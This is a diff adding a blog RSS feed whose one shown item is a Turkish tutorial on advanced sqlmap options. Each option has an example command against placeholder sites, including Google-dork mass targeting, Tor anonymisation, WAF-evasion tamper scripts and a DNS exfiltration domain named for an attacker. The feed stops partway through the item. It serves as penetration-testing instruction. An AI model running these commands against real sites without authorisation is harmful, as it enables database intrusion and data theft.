@@ -1,0 +1,352 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ahmet Mersin</title>
+    <description>Cyber Security Researcher / Pentester /Junior Developer</description>
+    <link>https://ahmetmersin.com//</link>
+    <atom:link href="https://ahmetmersin.com//feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sat, 16 Sep 2017 02:57:16 +0300</pubDate>
+    <lastBuildDate>Sat, 16 Sep 2017 02:57:16 +0300</lastBuildDate>
+    <generator>Jekyll v3.0.2</generator>
+    
+      <item>
+        <title>Sqlmap Advanced Seviye!</title>
+        <description>&lt;p&gt;Bildiğiniz üzere Sqlmap, sql injection testleri için kullanılan ve her wep aplication pentesterin bildiği bir script yazılım artık siz ne diye tanımlarsanız. Python ile yazılmiş olan Sqlmap’in genel kullanımı herkes tarafından bilinse de aslında bir çok güzel özelliği beraberinde getirmekte. Çoğumuz genel parametreler ile kullandığımızda sonuca ulaşsak da, aslında daha advanced seviyede kullanıldığında tam bir canavara dönüşen bir script.Bu papers’da Sqlmap’in -hh komutu ile özelliklerine baktığımız zamanki özelliklerini ve kullanımlarını adım adım inceleyeceğiz.Sql ınjectıon’unu yada sqlmap ın ne oldugunu bu papersda anlatmıyacagım.Lufen yorum atıp paylasırsanız daha cok kısının bu bılgıye erısmesını saglarsınız.Cunku suanda bu sqlmap papers ı en genıs sqlmap ı anlatıyor.Emınımkı bazı ozellıklerı gordugunuzde sasıracaksınız ve ben o yuz ıfadenizı buradan hıssedebılıyorum…Pandoranın kapagını actım,bu heyecana ortak ol!&lt;/p&gt;
+
+&lt;p&gt;Baslıyorum kahvenı kap gel:&lt;/p&gt;
+
+&lt;p&gt;Options sekmesi:&lt;/p&gt;
+
+&lt;p&gt;-h, –help: Basit yardım ve kullanım özelliklerini yazdıran komutumuz.&lt;/p&gt;
+
+&lt;p&gt;-hh: Advanced yardım ve kullanım özelliklerini yazdıran komutumuz.&lt;/p&gt;
+
+&lt;p&gt;–version: Mevcut sqlmap sürümünü gösteren ve çıkış yapan komutumuz.&lt;/p&gt;
+
+&lt;p&gt;-v: Default olarak 1 tanımlı gelen ve sqlmap çalıştığı süre zarfında bize gösterdiği çıktıların gösterimini belirlediğimiz verbose komutumuz. 0 ile 6 arasında değişmekte. 0 en az çıktıyı döndürürken, 6 en çok çıktı ile sonuçları döndürmekte.&lt;/p&gt;
+
+&lt;p&gt;Target sekmesi: Hedef(ler)in seçimini yapmamız için kullanmamız gereken parametrelerin bulunduğu kategorimiz. En azından birinin seçilmesi gerekmektedir.&lt;/p&gt;
+
+&lt;p&gt;-d: Veritabanına direct erişim yapabileceğimiz link eğer elimizdeyse, kullanabileceğimiz komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -d  mysql://root:password@192.168.x.x:3306/Information_Schema&lt;/p&gt;
+
+&lt;p&gt;ile Mysql kullanan ve verilen ip adresinin 3306 portu üzerinden, belirttiğimiz kullanıcı adı ve şifre ile information_schema bilgisinin çekilmesi işlemini yapabiliyoruz.&lt;/p&gt;
+
+&lt;p&gt;-u, –url: Veribanına direkt erişimimiz yoksa ve injection yolu ile deneme yapmak istiyorsak, kullanabileceğimiz komutumuz.Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “http://www.websitesi.com/test.php?id=1”&lt;/p&gt;
+
+&lt;p&gt;-l: Burp veya WebScarab ile çekilmiş log dosyalarını kullanarak, testler gerçekleştirmemizi sağlayan komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -l /home/user/Desktop/log.txt&lt;/p&gt;
+
+&lt;p&gt;-x: Sitemap(.xml) dosyasını kullarak testler gerçekleştirmemizi sağlayan komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -x “http://www.siteadresi.com/sitemap.xml”&lt;/p&gt;
+
+&lt;p&gt;-m: Belirlenen txt dosyası içerisindeki linkleri satır satır deneme usulü ile testlerimizi gerçekleştirmemizi sağlayan parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -m /home/user/Desktop/pentest.txt&lt;/p&gt;
+
+&lt;p&gt;-r: Belirlenen txt dosyası içerisinde verilmiş olan requestleri(post/get) kullanarak, testlerimizi gerçekleştirmemizi sağlayan parametrelerimiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -r /home/userDesktop/request.txt&lt;/p&gt;
+
+&lt;p&gt;-g: Google dork ile belirli bir pattern’e sahip siteler üzerinde testler gerçekleştirmemizi sağlayan komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -g “.php?id=”&lt;/p&gt;
+
+&lt;p&gt;-c: Sqlmap ayarlarının custom bir config.ini dosyasından yüklenmesini istiyorsak kullanacağımız komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -c customconfig.ini -g ….&lt;/p&gt;
+
+&lt;p&gt;Request Sekmesi: Hedef URL’e bağlantı ile ilgili yapacağımız ayarlamaları belirttiğimiz parametrelerin bulunduğu kategorimiz.&lt;/p&gt;
+
+&lt;p&gt;–data: POST metodu ile gönderim yapılacağı zaman, gönderilecek verinin tanımlandığı kısım. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/login.php” –data=”username=example&amp;amp;password=example&amp;amp;action=submit”&lt;/p&gt;
+
+&lt;p&gt;–param-del: Gönderilecek değerlerin hangi değerlerden itibaren ayrılmasının belirleneceği komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/login.php” –data=”username=example&amp;amp;password=example&amp;amp;action=submit” –param-del=”&amp;amp;”&lt;/p&gt;
+
+&lt;p&gt;–cookie: Eğer site içerisinde testler için bir cookie kullanmamız gerekiyorsa, kullanacağımız parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/uye.php?id=12345” –cookie=”session=a235723v5sdg35”&lt;/p&gt;
+
+&lt;p&gt;–cookie-del: Cookie içeriside gönderilecek değerlerin hangi değerlerden itibaren ayrılması gerektiğiin belirleneceği komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/uye.php?id=12345” –cookie=”session=a235723v5sdg35” –cookie-del=”&amp;amp;”&lt;/p&gt;
+
+&lt;p&gt;–load-cookies: Netscape/wget formatında tanımlı dosya içerisinden cookielerin yüklenmesi amacı ile kullanılan komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/uye.php?id=12345” –load-cookies /home/user/Desktop/cookieLoader.txt&lt;/p&gt;
+
+&lt;p&gt;–drop-set-cookie: Cevap olarak gelen başlık bilgileri içerisindeki Set-Cookie değerini görmezden gelmek amacıyla kullanılan parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/uye.php?id=12345” –cookie=”session=2b3k32b4c238c” –drop-set-cookie&lt;/p&gt;
+
+&lt;p&gt;–user-agent: Testlerimizde kullanacağımız User-Agent değerini kendimiz belirlemek için kullanabileceğimiz komutumuz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –user-agent=”Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0”&lt;/p&gt;
+
+&lt;p&gt;–random-agent: Testlerimizde kullanacağımı User-Agent değerinin, sqlmap ile hazır gelen user-agent değerlerinin bulunduğu dosya içeriisnden random olarak atanması için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –random-agent&lt;/p&gt;
+
+&lt;p&gt;–host: Gönderilen başlık bilgisi içerisindeki Host kısmını, request yapılacak site kısmını, istediğimiz gibi değiştirmek için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –host=www.siteadi.com&lt;/p&gt;
+
+&lt;p&gt;–referer: Gönderilen başlık bilgisi içerisindeki Referer kısmını, hangi adres üzerinden yönlendirilme yaptığımızı (history -1 gibi), istediğimiz gibi değiştirmek için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –referer=www.gosterilecekAdresimiz.com&lt;/p&gt;
+
+&lt;p&gt;–headers: Gönderilen başlık bilgisi içerisindeki diğer başlık bilgilerini (Accept-Encoding gibi), istediğimiz gibi değiştirmek amacıyla kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –headers=”User-Agent: Mozilla/5.0 (X11;Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0”&lt;/p&gt;
+
+&lt;p&gt;–auth-type: Site üzerinde yapılacak authentication işleminin tipini belirtmek için kullanabileceğimiz parametremiz. Basic, Digest, NTLM ya da PKI gibi değerler alabilir. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/login.php” –auth-type=”Basic”&lt;/p&gt;
+
+&lt;p&gt;–auth-cred: Site üzerinde yapılacak authentication işleminde gönderilecek veirleri tanımlamak için kullandığımız parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/login.php” –auth-type=”Basic” –auth-cred=”username:password”&lt;/p&gt;
+
+&lt;p&gt;–auth-private: Login işlemini pem sertifikası ile yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/login.php” –auth-type=”Basic” –auth-cred=”user:pass” –auth-private=”asd.pem”&lt;/p&gt;
+
+&lt;p&gt;–proxy: Proxy kullanarak işlem yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –proxy=”http://127.0.0.1:8080”&lt;/p&gt;
+
+&lt;p&gt;–proxy-cred: Proxy kullanmak istiyorsak ve bağlanacağımız proxy’e ait user/pass değerleri varsa, bunları tanımlamak için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –proxy=”http://proxysite.com:portNumber” –proxy-cred=”proxyUser:proxyPass”&lt;/p&gt;
+
+&lt;p&gt;–proxy-file: Proxy bilgilerini bir dosya içerisinden yüklemek istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –proxy-file=dosyaAdi&lt;/p&gt;
+
+&lt;p&gt;–ignore-proxy: Sisteme tanımlı default proxy ayarlarını kullanmak istemiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –ignore-proxy&lt;/p&gt;
+
+&lt;p&gt;–tor: Tor network’ünü kullanarak gizliliğimizi sağlamak istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –tor&lt;/p&gt;
+
+&lt;p&gt;–tor-port: Tor network’üne hangi port üzerinden bağlanmak istediğimizi belirtmek için kullandığımız parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –tor –tor-port=9150&lt;/p&gt;
+
+&lt;p&gt;–tor-type: Tor ağına;HTTP, SOCKS4 ya da SOCKS5 ile hangisinden bağlanmak istiyorsak tanımlamak için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –tor –tor-type=SOCKS5&lt;/p&gt;
+
+&lt;p&gt;–check-tor: Tor ağına, bağlantının sağlanıp sağlanmadığını test etmek için kullanabileceğimiz parametremiz. Eğer ağa bağlantı yoksa, geçerli sqlmap testi otomatik olarak iptal edilir. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –tor –tor-type=SOCKS5 –check-tor&lt;/p&gt;
+
+&lt;p&gt;–delay: Her bir HTTP request için aralarda beklenilecek süreyi saniye cinsinden ifade etmek amacıyla kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –delay=5&lt;/p&gt;
+
+&lt;p&gt;–timeout: Bir bağlantının timeout olarak nitelendirilip isteğin iptal edilmesi için gerekli süreyi saniye cinsinden ayarlamak için kullanabileceğimiz parametremiz. Default değer olarak 30sn alır. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –timeout=10&lt;/p&gt;
+
+&lt;p&gt;–retries: Bağlantımız timeout olup iptal edildiğinde, aynı requestin kaç kere daha deneneceğini ayarlamak için kullanabileceğimiz parametremiz. Default olarak 3 değerini alır. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –timeout=5 –retries=20&lt;/p&gt;
+
+&lt;p&gt;–randomize: Verilen parametrelerin random değerlerle değiştirilmesini istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –randomize=id&lt;/p&gt;
+
+&lt;p&gt;–safe-url: Test süresince belli bir frekansta ziyaret edilecek url adresimizi belirlemek istiyorsak kullanabileceğimiz parametremiz. Bazı sistemlerde belli bir sayıda hatalı giriş ile session sonlandırılmasını önlemek amacı ile kullanılır. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –safe-url=”www.siteadi.com”&lt;/p&gt;
+
+&lt;p&gt;–safe-freq: Test süresince ziyaret edilmesini istediğimiz url’in zaman ayarını(frekansını) yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –safe-url=”www.siteadi.com” –safe-freq=3&lt;/p&gt;
+
+&lt;p&gt;–skip-urlencode: Test etmek istediğimiz parametrelerin url-encoding işleminden geçirilme işlemini atlamak istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –skip-urlencode&lt;/p&gt;
+
+&lt;p&gt;–force-ssl: SSL/HTTPS bağlantısını kullanmasını zorlamak istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “https://www.siteadi.com/testet.php?id=1” –force-ssl&lt;/p&gt;
+
+&lt;p&gt;-hpp: “HTTP Parameter Pollution” metodu ile test işlemimizi gerçekleştirmek istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?a=1&amp;amp;b=2&amp;amp;c=3” –hpp&lt;/p&gt;
+
+&lt;p&gt;–eval: Belirtilen python kodunu istek yapılmadan önce çalıştırıp, ardından bu sonuca göre istek yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=123&amp;amp;id2=456” –eval=”import hashlib; id=hashlib.md5(id).hexdigest()”&lt;/p&gt;
+
+&lt;p&gt;Optimization Sekmesi: Sqlmap’i performans alanında optimize etmek istiyorsak kullanabileceğimiz parametrelerin bulunduğu kategorimiz.&lt;/p&gt;
+
+&lt;p&gt;-o: Tüm optimizasyon anahtarlarını kullanmak istiyorsak kullanabileceğimiz parametremiz. –keep-alive, –null-connection ve –threads=3 olarak default tanımlanır. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” -o&lt;/p&gt;
+
+&lt;p&gt;–predict-output:  txt/common_outputs.txt dosyası içerisindeki en çok karşımıza çıkan çıktıları tahmin ederek, test işlemimizin daha hızlı bitmesi konusunda yardımcı olur. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –predict-output&lt;/p&gt;
+
+&lt;p&gt;–keep-alive: Kalıcı(persistent) HTTP(s) bağlantıları kurmak için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –keep-alive&lt;/p&gt;
+
+&lt;p&gt;–null-connection: HTTP cevabının uzunluğunu, HTTP body’i çekmeden belirlemek için kullanılan parametremiz. Aktif edildiğinde sqlmap iki farklı NULL bağlantı tekniği ile test ve exploit işlemleri gerçekleştirir. Bunlar Range ve Head’dir. Bunlardan herhangi biri test edilen server tarafından da destekleniyorsa, işlemimizi hızlandırmamıza yardımcı olur. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –null-connection&lt;/p&gt;
+
+&lt;p&gt;–threads: Multi-threading ile sqlmap’in maximum kaç tane HTTP(s) isteği yapabileceğini belirlemek için kullanabileceğimiz parametremiz. Özellikle bruteforce searching işlemlerinde, aramamızı oldukça hızlandıran bu yöntem, performans sebepleri gerekçesiyle max. 10 thread kullanılması tavsiye edilmekte. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –threads=10&lt;/p&gt;
+
+&lt;p&gt;Injection Sekmesi: Hangi parametrelerin test edileceği, kişisel payload tanımlamaları ve tamper scriptleri tanımlamaları gibi ayarlamaları yapabileceğimiz parametrelerin bulunduğu kategorimiz.&lt;/p&gt;
+
+&lt;p&gt;-p: Verilen parametreler içerisinde sadece belirli parametrelerin test edilmesini istiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?username=asd&amp;amp;password=asd&amp;amp;denemeA=1&amp;amp;denemeB=2&amp;amp;denemeC=3” -p denemeA&lt;/p&gt;
+
+&lt;p&gt;–skip: Verilen parametreler içerisinde sadece bazı parametrelerin test edilmesini istemiyorsak kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?username=asd&amp;amp;password=asd&amp;amp;denemeA=1&amp;amp;denemeB=2&amp;amp;denemeC=3” –skip denemeA,denemeB,denemeC&lt;/p&gt;
+
+&lt;p&gt;–dbms: Sqlmap’e yardımcı olmak adına, eğer backend’de çalışan database management system’i biliyorsak, dbms ile tanımlayabilmekteyiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –dbms=”MySql”&lt;/p&gt;
+
+&lt;p&gt;–os: Sqlmap’e yardımcı olmak adına, eğer işletim sistemini biliyorsak, os ile bunu da tanımlayabilmekteyiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –dbms=”MySql” –os=”Linux”&lt;/p&gt;
+
+&lt;p&gt;–invalid-bignum: Sqlmap’in orjinal parametre değerlerini geçersiz kılmaya çalışırken kullandığı yollara çok büyük sayıları da (Örn:999999) eklemek için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –invalid-bignum&lt;/p&gt;
+
+&lt;p&gt;–invalid-logical: Sqlmap’in orjinal parametre değerlerini geçersiz kılmaya çalışırken kullandığı yollara Boolen denemeleri de (Örn: id=1 AND 2=5) eklemek için kullanabileceğimiz parametrelerimiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –invalid-logical&lt;/p&gt;
+
+&lt;p&gt;–invalid-string: Sqlmap’in orjinal parametre değerlerini geçersiz kılmaya çalışırken kullandığı yollara rastgele string değerler ile (Örn: ad=xUqmnfi) eklemek için kullanabileceğimiz parametrelerimiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?ad=intelrad” –invalid-string&lt;/p&gt;
+
+&lt;p&gt;–no-cast: Payload casting mekanizmasını kapatır ve payloadları kısaltır. Ancak default olarak gelen ayrıcalıkları tam olarak kullanamayabiliriz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –no-cast&lt;/p&gt;
+
+&lt;p&gt;–no-escape: Test edeceğimiz server üzerinde “mysql_real_escape_string” ya da “magic_quotes” gibi ifadeler kullanılıyorsa,  tek tınak gibi ifadelerimizi “SELECT char(102)+char(111)” gibi ifadelerle test edip, zamandan kazanmak için kullanabileceğimiz parametremizdir. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –no-escape&lt;/p&gt;
+
+&lt;p&gt;–prefix: Test edilecek parametreleri, payloadların önüne istediğimiz değeri ekleyerek daha da özelleştirebileceğimiz parametremizdir. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?ad=deneme” –prefix “’)”&lt;/p&gt;
+
+&lt;p&gt;–suffix: Test edilecek parametreleri, payloadların sonuna istediğimiz değeri ekleyerek daha da özelleştirebileceğimiz parametrelerimizdir. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?ad=dememe” –suffix “’)”&lt;/p&gt;
+
+&lt;p&gt;–tamper:  Eğer kullanıcı ile back-end database arasında zayıf bir giriş kontrolü varsa injection yapılacak stringleri WAF’tan geçirebilmek amacı ile kullanılan parametremiz. Önüne alacağı parametre sqlmap klasörü içerisindeki tamper klasörü içerisinden kullanılır. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –tamper=”between”&lt;/p&gt;
+
+&lt;p&gt;[u][b]Detection Sekmesi:[/b][/u] Risk ve seviye belirleme gibi, belirleme adımlarını belirlemek için kullanabileceğimiz parametrelerimizin bulunduğu kategorimiz.&lt;/p&gt;
+
+&lt;p&gt;–level: 1 ile 5 arasında değerler alabilen parametremiz. 1. seviyede daha kısıtlı testler denetlenirken, 5.seviyede daha fazla payload, daha detaylı prefix ve suffixler ile zenginleştirilmiş payloadlar kullanılmaktadır. Ayrıca HTTP Cookie başlığı 2.seviyeden sonra ve HTTP User-Agent/Referer başlıkları da seviye 3’ten sonra denetlenmektedir. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –level=5&lt;/p&gt;
+
+&lt;p&gt;–risk: 1 ile 3 arasında değerler alabilen parametremiz. Eğer belirtilmezse default olarak 1 değerini alır. Risk 1 daha sınırlı sql cümleleri ile denetleme yapar. Risk 2’de risk 1’in üzerine heavy-query time based saldırılar da denetlemeye tabii tutulur. Risk 3’te ise ekstradan Or-based testler de eklenir.&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –risk=3&lt;/p&gt;
+
+&lt;p&gt;–string: Sorguyu çalıştırdıktan sonra, belirlediğimiz string ile karşılaştırma yapıp, karşılaştırma varsa True olarak dönen değeri eşleştirmek için kullandığımız parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –string=”Kullanici”&lt;/p&gt;
+
+&lt;p&gt;–not-string: Sorguyu çalıştırdıktan sonra, belirlediğimiz string ile karşılaştırma yapıp, karşılaştırmamız yoksa True olarak dönen değeri eşleştirmek için kullandığımız parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –not-string=”Kullanici”&lt;/p&gt;
+
+&lt;p&gt;–regexp: Sorguyu çalıştırdıktan sonra, belirlediğimiz regex ifade ile karşılaştırma yapıp, karşılaştırmamız varsa True olarak dönen değeri eşleştirmek için kullandığımız parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –regexp=”[0-9]{11}”&lt;/p&gt;
+
+&lt;p&gt;–code: HTTP sorgusu sonrası, server tarafından dönen cevaba göre (200 True ve 401 False) eşleştirmek için kullandığımız parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –code=200&lt;/p&gt;
+
+&lt;p&gt;–text-only: CSS,JS gibi tagleri göz ardı ederek, sadece metin içeriğine göre sayfaları karşılaştırmak için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –text-only&lt;/p&gt;
+
+&lt;p&gt;–titles: Sadece website başlığı baz alınarak sayfaları karşılaştırmak için kullanabileceğimiz parametremiz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –titles&lt;/p&gt;
+
+&lt;p&gt;[u][b]Techniques Sekmesi: [/b][/u]Kullanılacak SQL Injection tekniklerini belirlemek için kullanacağımız parametrelerimizin bulunduğu kategorimiz.&lt;/p&gt;
+
+&lt;p&gt;–technique: Kullanılacak SQL Injection tekniklerini belirlediğimiz parametremiz. Default olarak BEUSTQ ( Bool-Based Blind, Error-Based, Union-Query Based, Stacked Query, Time-Based Blind, Inline Queries). Ancak bunlardan sadece bazılarının test için kullanılmasını istiyorsak o zaman örnek kullanımımız aşağıdaki gibi olmakta:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –technique=”BEST”&lt;/p&gt;
+
+&lt;p&gt;–time-sec: DBMS cevabının gecikmesi için belirlenen süreyi tanımlayabileceğimiz parametremiz. Default olarak 5 tanımlıdır. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –time-sec=10&lt;/p&gt;
+
+&lt;p&gt;–union-cols:  Default olarak sqlmap, UNION query’ler için 1’den 10’a kadarlık kolonlarda deneme yapar.  Level değerini değiştirerek 50 kolona kadar çıkarabilsek de biz sadece bunu değiştirmek istiyorsak bu parametreyi kullanabiliriz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –union-cols=1-50&lt;/p&gt;
+
+&lt;p&gt;–union-char: Default olarak sqlmap, UNION query’ler için NULL kullanır ve denemelerini bu koşul ile yapar. Level değerini değiştirerek NULL dışında random sayılarla da testler gerçekleştirse de sadece bu değeri manuel olarak değiştirmek istiyorsak bu parametreyi kullanabiliriz. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –union-char 2013&lt;/p&gt;
+
+&lt;p&gt;–union-from: Sql injection için UNION query’de FROM kısmında kullanılacak tabloyu belirtmemiz (daha çok zorlamak olarak da düşünülebilir) için kullanabileceğimiz parametremizdir. Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –union-from=tabloIsmi&lt;/p&gt;
+
+&lt;p&gt;–dns-domain: Eğer test eden(biz), bir domain server’a sahipsek, blind-injection saldırıları hızlandırmak için kullanabileceğimiz parametremiz. Açıklaması çok uzun ve detaylı olduğu için buradan açıklanmayacak. 53 numaralı portu kullandığı için, sudo yetkisi ile çalıştırmamız gerekmektedir. Parametrenin kullanım örneği aşağıdaki gibidir:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –dns-domain saldirganadam.com&lt;/p&gt;
+
+&lt;p&gt;–second-order: Eğer inject ettiğimiz payload’ın sonucu bir başka sayfada gösteriliyorsa kullanabileceğimiz parametremizdir. Örnek kullanımı:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” –second-order&lt;/p&gt;
+
+&lt;p&gt;[u][b]Fingerprint Sekmesi: [/b][/u]Veritabanı yönetim sistemi belirleme sistemleri için kullanılan parametrelerin bulunduğu kategorimiz.&lt;/p&gt;
+
+&lt;p&gt;-f ya da –fingerprint: Default olarak sqlmap, veritabanı sisteminin fingerprint’ini bize döndürebilmekte. Eğer daha detaylı bir arama yapmak istiyorsak kullanabileceğimiz parametremiz. Bu parametre ile birlikte sqlmap gerçek DBMS version bilgisini, eğer mümkünse işletim sistemi, mimarisi gibi bilgileri de bize döndürmeye çalışacaktır. Eğer daha doğru sonuçlara ulaşmak istiyorsak, bunun yanında -b ya da –banner parametrelerini de kullanabiliriz.Örnek kullanım:&lt;/p&gt;
+
+&lt;p&gt;sqlmap -u “www.siteadi.com/testet.php?id=1” -f&lt;/p&gt;
+</description>
+        <pubDate>Fri, 15 Sep 2017 14:48:23 +0300</pubDate>
+        <link>https://ahmetmersin.com//2017/Advanced-sqlmap/</link>
+        <guid isPermaLink="true">https://ahmetmersin.com//2017/Advanced-sqlmap/</guid>
+        
+        <category>sqlmap</category>
+        
